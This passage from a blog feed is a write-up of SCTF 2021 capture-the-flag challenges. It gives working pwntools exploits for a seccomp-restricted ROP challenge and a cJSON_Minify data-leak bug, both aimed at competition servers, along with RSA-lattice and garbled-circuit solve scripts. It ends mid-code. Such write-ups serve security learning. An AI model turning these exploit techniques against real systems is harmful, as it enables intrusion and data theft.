class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><ol start="2"><li>123</li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SCTF 2021</title>
      <link href="/2021/12/28/sctf-2021/"/>
      <url>/2021/12/28/sctf-2021/</url>
      
        <content type="html"><![CDATA[<h1 id="SCTF-2021"><a href="#SCTF-2021" class="headerlink" title="SCTF 2021"></a>SCTF 2021</h1><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="roop"><a href="#roop" class="headerlink" title="roop"></a>roop</h3><ol><li><p>只允许 ORW:</p><pre class="line-numbers language-none"><code class="language-none">$ seccomp-tools dump .&#x2F;roop  line  CODE  JT   JF      K&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 0000: 0x20 0x00 0x00 0x00000000  A &#x3D; sys_number 0001: 0x25 0x03 0x00 0x40000000  if (A &gt; 0x40000000) goto 0005 0002: 0x15 0x03 0x00 0x00000002  if (A &#x3D;&#x3D; open) goto 0006 0003: 0x15 0x02 0x00 0x00000000  if (A &#x3D;&#x3D; read) goto 0006 0004: 0x15 0x01 0x00 0x00000001  if (A &#x3D;&#x3D; write) goto 0006 0005: 0x06 0x00 0x00 0x00000000  return KILL 0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><code>0x4AF102</code> 处有 “flag” 字符串.</p></li><li><p><code>read_sys()</code> 函数中有点猫腻, rbp 那个位置要放个可写的地址, 而且后面还有个 pop, 后面利用这里面的 syscall 时要注意填充.</p><pre class="line-numbers language-none"><code class="language-none">.text:000000000040182A                 push    rbp.text:000000000040182B                 mov     rbp, rsp.text:000000000040182E ; 2:   return (unsigned int)sys_read(0, a1, 0x1F4uLL);.text:000000000040182E                 mov     [rbp+buf], rdi.text:0000000000401832                 mov     [rbp+var_4], 0C359h.text:0000000000401839                 mov     eax, 0.text:000000000040183E                 mov     edi, 0          ; fd.text:0000000000401843                 mov     rsi, [rbp+buf]  ; buf.text:0000000000401847                 mov     edx, 1F4h       ; count.text:000000000040184C                 syscall                 ; LINUX - sys_read.text:000000000040184E                 mov     [rbp+var_4], eax.text:0000000000401851                 mov     eax, [rbp+var_4].text:0000000000401854                 pop     rbp.text:0000000000401855                 retn.text:0000000000401855 ; &#125; &#x2F;&#x2F; starts at 40182A.text:0000000000401855 read_sys        endp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>EXP</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'sp'</span><span class="token punctuation">,</span> <span class="token string">'-h'</span><span class="token punctuation">]</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"123.60.140.20"</span><span class="token punctuation">,</span> <span class="token number">2111</span><span class="token punctuation">)</span><span class="token comment"># p = process("./roop")</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x0000000000401d9e</span>pop_rsi_ret <span class="token operator">=</span> <span class="token number">0x00000000004086de</span>pop_rax_ret <span class="token operator">=</span> <span class="token number">0x000000000043fed7</span>pop_rdx_rbx_ret <span class="token operator">=</span> <span class="token number">0x000000000046d86b</span>flag_s <span class="token operator">=</span> <span class="token number">0x4AF102</span>bss <span class="token operator">=</span> <span class="token number">0x4B1500</span>bss2 <span class="token operator">=</span> <span class="token number">0x4B2B79</span>main <span class="token operator">=</span> <span class="token number">0x401868</span><span class="token comment"># 用 read_sys() 中的 syscall</span>syscall_ret <span class="token operator">=</span> <span class="token number">0x40184C</span><span class="token comment"># open 开出来的 fd 应该是 3</span>fd <span class="token operator">=</span> <span class="token number">3</span>payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x20</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss2<span class="token punctuation">)</span> <span class="token operator">+</span> \        <span class="token comment">#   open("flag", 0)</span>        p64<span class="token punctuation">(</span>pop_rax_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>flag_s<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>syscall_ret<span class="token punctuation">)</span> <span class="token operator">+</span> \        <span class="token comment">#   填充    read(fd, bss, 0x30)</span>        p64<span class="token punctuation">(</span>bss2<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rax_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>fd<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx_rbx_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>syscall_ret<span class="token punctuation">)</span> <span class="token operator">+</span> \        <span class="token comment">#   填充    write(1, bss, 0x30)</span>        p64<span class="token punctuation">(</span>bss2<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rax_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx_rbx_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>syscall_ret<span class="token punctuation">)</span> <span class="token operator">+</span> \        p64<span class="token punctuation">(</span>bss2<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token comment"># gdb.attach(p)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="dataleak"><a href="#dataleak" class="headerlink" title="dataleak"></a>dataleak</h3><ol><li><code>cJSON_Minify</code> 遇到 “/*” 的时候下标最后会 +2, 利用这个漏洞吃掉 3 个字符串之间的 ‘\x00’; 而且会自动吃掉空格。左挪挪右挪挪把那个 “this_is_data_in_server” 挪出来就行了.<pre class="line-numbers language-C" data-language="C"><code class="language-C">else if ( *v11 &#x3D;&#x3D; &#39;&#x2F;&#39; &amp;&amp; v11[1] &#x3D;&#x3D; &#39;*&#39; )&#123;    while ( *v11 &amp;&amp; (*v11 !&#x3D; &#39;*&#39; || v11[1] !&#x3D; &#39;&#x2F;&#39;) )        ++v11;    v11 +&#x3D; 2;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><strong>EXP</strong><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># context.log_level = "debug"</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'sp'</span><span class="token punctuation">,</span> <span class="token string">'-h'</span><span class="token punctuation">]</span><span class="token comment"># p = process("./cJSON_PWN")</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"124.70.202.226"</span><span class="token punctuation">,</span> <span class="token number">2101</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0xc</span> <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> <span class="token string">'*'</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'bbbb'</span> <span class="token operator">+</span> <span class="token string">' '</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0xc</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> <span class="token string">'*'</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>a <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">5</span> <span class="token operator">+</span> <span class="token string">' '</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0xc</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> <span class="token string">'*'</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">' '</span><span class="token operator">*</span><span class="token number">0xc</span> <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> <span class="token string">'*'</span><span class="token comment"># gdb.attach(p, gdbscript = "b *$rebase(0x120D)")</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>b <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token operator">+</span>b<span class="token punctuation">)</span><span class="token comment"># print("a = " + a + ", b = " + b)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="CRY"><a href="#CRY" class="headerlink" title="CRY"></a>CRY</h2><h3 id="Lattice-RSA"><a href="#Lattice-RSA" class="headerlink" title="Lattice_RSA"></a>Lattice_RSA</h3><ol><li>CopperSmith(<a href="https://eprint.iacr.org/2014/549.pdf">https://eprint.iacr.org/2014/549.pdf</a>)</li><li><strong>EXP</strong><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># sage</span>e1 <span class="token operator">=</span> <span class="token number">9545097209030256775216443121829852487787380086315441423236592000839309846039550602130662744273474762892095845712248185351595030092141485752003885019152268353509264865332005730567800065218726010684572302315291967868766793202912693755784425680016425189250482664755863124379283931403254016082077557111339647889</span>n1 <span class="token operator">=</span> <span class="token number">98939456380792523662775017487084146158199369919759470465575759577838238544400854203012884028529070427777189722848860164139618018368139287530561049590738727981094118610846357860548707651233653701270301175858159871826699942130125407653338205286434016804567227501137095308022126944522749231530058497881261185653</span>c1 <span class="token operator">=</span> <span class="token number">55315487674581208936176703509670353978231044582491114364061992981458986632841065786061160594922107804965351583127534031661829212870815873676036345109665820229082797340089348236551436209969988935306699393106743928957238959317622905185712338429185098479804550934511329466829098245607393481855153276533732689734</span>e2 <span class="token operator">=</span> <span class="token number">59243789427417951194489862269417430952328673559766515223885035376877819796576206793435054362857070966888235333647478778158384173868938982383588960913340186622525635645816049372928121634881790492382629069066078703248800839522472210920458130523691729892148102876735855766860455039600156378352749345062721937209</span>n2 <span class="token operator">=</span> <span class="token number">104347855605891592910114852579961565604626906391213265775887363677904796055413085190935828673206199415533269569031451361031799754867385268572970064379073503906665805386452010801102766017395658092557842603350337718372544153615967374268293977782528578048412981645150044439520557593275256807763497840657428919077</span>c2 <span class="token operator">=</span> <span class="token number">102398006499486137660980667185708024925165256830809071209188976998384002930353742529713002440025603110530041319123321468674756588207972254892299747598693922335456071362447796282021604830025395235248733257046909682564607142251130963235661693343045300675990709137212806865651950929080932525655855441795236830180</span>e3 <span class="token operator">=</span> <span class="token number">85747500093914623676814521570837906391267663984326957989170968314694976569281309877349688441394449235970180279634338128332963787895719937398561401234322387037150946707257948321793874036110351063581214140307404280596740059504052727210571816961399578900374385250625544371549762415419859711307774733248827036469</span>n3 <span class="token operator">=</span> <span class="token number">125025456359945372693024749116364347012056768353381741583283104144583480532982415270618444535675894570724052935399666141513628840873824003925313455238817485549860905264933541873086612753584660074870129509952045033828170291542113197517274230326183877232286120958576866764084704325778588083293425203999205810141</span>c3 <span class="token operator">=</span> <span class="token number">72100429874928070585214359886622577441750665411714854015876430886408828429194918865497582935712040510387059400943960378641326114021899111137577322059200344646501253200629230286816720829672198420182128299025122114808347594611972141414087683155991740640913366675113748261101786118999803968607329180926248155617</span>Ns <span class="token operator">=</span> <span class="token punctuation">[</span>n1<span class="token punctuation">,</span> n2<span class="token punctuation">,</span> n3<span class="token punctuation">]</span>es <span class="token operator">=</span> <span class="token punctuation">[</span>e1<span class="token punctuation">,</span> e2<span class="token punctuation">,</span> e3<span class="token punctuation">]</span>cs <span class="token operator">=</span> <span class="token punctuation">[</span>c1<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> c3<span class="token punctuation">]</span>N <span class="token operator">=</span> <span class="token builtin">max</span><span class="token punctuation">(</span>Ns<span class="token punctuation">)</span>k <span class="token operator">=</span> <span class="token number">3</span>delta <span class="token operator">=</span> <span class="token number">0.375</span>epsilon <span class="token operator">=</span> sqrt<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">*</span> N<span class="token operator">^</span><span class="token punctuation">(</span>delta<span class="token operator">-</span><span class="token number">1</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span>n <span class="token operator">=</span> kC <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token operator">^</span><span class="token punctuation">(</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>n<span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">*</span> epsilon<span class="token operator">^</span><span class="token punctuation">(</span><span class="token operator">-</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>M <span class="token operator">=</span> Matrix<span class="token punctuation">(</span>ZZ<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token builtin">int</span><span class="token punctuation">(</span>C <span class="token operator">*</span> es<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token punctuation">(</span>Ns<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token builtin">int</span><span class="token punctuation">(</span>C <span class="token operator">*</span> es<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token punctuation">(</span>Ns<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token builtin">int</span><span class="token punctuation">(</span>C <span class="token operator">*</span> es<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token punctuation">(</span>Ns<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> C<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> C<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> C<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>K <span class="token operator">=</span> M<span class="token punctuation">.</span>LLL<span class="token punctuation">(</span><span class="token punctuation">)</span>need_x <span class="token operator">=</span> K <span class="token operator">*</span> M<span class="token punctuation">.</span>inverse<span class="token punctuation">(</span><span class="token punctuation">)</span>x<span class="token punctuation">,</span> y1<span class="token punctuation">,</span> y2<span class="token punctuation">,</span> y3 <span class="token operator">=</span> <span class="token operator">-</span>need_x<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>ys <span class="token operator">=</span> <span class="token punctuation">[</span>y1<span class="token punctuation">,</span> y2<span class="token punctuation">,</span> y3<span class="token punctuation">]</span>Ss <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">abs</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>Ns<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">-</span> es<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> x <span class="token operator">/</span> ys<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">]</span>Ds <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>sqrt<span class="token punctuation">(</span>Ss<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span><span class="token number">2</span> <span class="token operator">-</span> <span class="token number">4</span> <span class="token operator">*</span> Ns<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">]</span>pas <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token punctuation">(</span>Ss<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> Ds<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">]</span>ps <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>Ns<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    f <span class="token operator">=</span> x <span class="token operator">+</span> pas<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    f <span class="token operator">=</span> f<span class="token punctuation">.</span>monic<span class="token punctuation">(</span><span class="token punctuation">)</span>    p_solve <span class="token operator">=</span> f<span class="token punctuation">.</span>small_roots<span class="token punctuation">(</span>X <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">**</span> <span class="token number">160</span><span class="token punctuation">,</span> beta<span class="token operator">=</span><span class="token number">0.42</span><span class="token punctuation">)</span>    ps<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>p_solve<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> pas<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p1 <span class="token operator">=</span> ps<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>q1 <span class="token operator">=</span> n1<span class="token operator">//</span>p1<span class="token keyword">assert</span> p1<span class="token operator">*</span>q1<span class="token operator">==</span>n1<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> GCD<span class="token punctuation">,</span> long_to_bytes<span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> powmod<span class="token punctuation">,</span> invertphi1 <span class="token operator">=</span> <span class="token punctuation">(</span>p1<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q1<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d1 <span class="token operator">=</span> invert<span class="token punctuation">(</span>e1<span class="token punctuation">,</span> phi1<span class="token punctuation">)</span>r <span class="token operator">=</span> powmod<span class="token punctuation">(</span>c1<span class="token punctuation">,</span> d1<span class="token punctuation">,</span> n1<span class="token punctuation">)</span><span class="token keyword">assert</span> <span class="token builtin">len</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">512</span>C <span class="token operator">=</span> <span class="token number">314138995705134963765949674209997674579520613296385936644494323356626474616449345832002116061032387789940232889811877417810577261174504328571142196672295961635382151605788845659832250695248133655805670920526231489642291822105961881028933410090118643915808621533888227382756678986914466713549255082875872573630738336022955681786779227894866903014980470029300129311175129426104388783114413927510414404318697951064311913497410213165287013303821435193696139330480491</span>pqr <span class="token operator">=</span> <span class="token number">911619948379135753280277158472338758620401367671839695302515524798781840672067948187113857703065845795822924511361587073726701234792252232996432637222385990530844261677850096042369704113324684160539535870348348879313722193048824463097747849639034518789021825189407467150941299095291906449325771599816822640144434277887115737049026356758054116641646403968823314685604673290554098181881098527931284097939456611464715559804244238286600413220755256136717571673115011</span>pq <span class="token operator">=</span> pqr<span class="token operator">//</span>r<span class="token keyword">assert</span> pq<span class="token operator">*</span>r<span class="token operator">==</span>pqr<span class="token comment"># print(pq)</span><span class="token comment"># pq = 125344179764788452935958110666600751722211963386020321971128464236999765401250458368340341394237141874926209998421276275176144081702712536364906046934659970775376635578551307310851053853612888660035922692903835246762915463074024563925867028110418848125938836672083837320222436259178292257202682401312848752623</span><span class="token comment"># factor pq by yafu</span>q <span class="token operator">=</span> <span class="token number">11195721493713053816872473040574427113590459426801501041936696952855046206603519936162050813309235275210747351857314783073431341913954290041930449553437457</span>p <span class="token operator">=</span> <span class="token number">11195721493713053816872473040574427113590459426801501041936696952855046206603519936162050813309235275210747351857314783073431341913954290041930449553437439</span><span class="token keyword">assert</span> pqr<span class="token operator">==</span>p<span class="token operator">*</span>q<span class="token operator">*</span>rphi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>r<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> invert<span class="token punctuation">(</span>p<span class="token operator">*</span>q<span class="token operator">*</span>q<span class="token operator">*</span>r<span class="token operator">*</span>r<span class="token operator">*</span>r<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>flag <span class="token operator">=</span> powmod<span class="token punctuation">(</span>C<span class="token punctuation">,</span>d<span class="token punctuation">,</span>p<span class="token operator">*</span>q<span class="token operator">*</span>r<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="ciruit-map"><a href="#ciruit-map" class="headerlink" title="ciruit map"></a>ciruit map</h3><ol><li>姚氏电路, <a href="https://github.com/ljahum/crypto-challenges/tree/e5a7cd6d5527c6d9ba116f7e0c2c3e3c4b04cb38/2020%E5%BD%92%E6%A1%A3/dice%20ctf2020/garbled">原题</a>, <a href="https://jsur.in/posts/2021-02-08-dicectf-2021-garbled">题解</a>.</li><li>用中间相遇找出 gate 5 和 6 中满足以下条件的所有密钥对$(k_1,k_2)$: 可以令 G_Table 中相应的 $E_{k_1}(E_{k_2}(0))$ 经过两次反向的 decode 得到 0. 而且由于 5 和 6 都是与门, 所以它们的真值表中有 3 个输出为假, 1 个为真. 在这些密钥对中筛选满足令 gate 5 的输出中有 3 个相同, 一个不同的, 即可得到它们的两个输入所对应的密钥值: $k_1^0,k_1^1,k_2^0,k_2^1$. 稍微修改一下 Joseph 博客中的代码即可:<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> block_cipher <span class="token keyword">import</span> encrypt_data<span class="token punctuation">,</span> decrypt_data<span class="token punctuation">,</span> decrypt<span class="token keyword">from</span> public_data <span class="token keyword">import</span> G_Table <span class="token keyword">as</span> g_tables<span class="token keyword">from</span> collections <span class="token keyword">import</span> defaultdict<span class="token keyword">from</span> tqdm <span class="token keyword">import</span> tqdm<span class="token keyword">import</span> json<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[!] generating lookup table...'</span><span class="token punctuation">)</span>ENCRYPTIONS_OF_ZERO <span class="token operator">=</span> defaultdict<span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">)</span><span class="token keyword">for</span> key <span class="token keyword">in</span> tqdm<span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">**</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    ct <span class="token operator">=</span> encrypt_data<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> key<span class="token 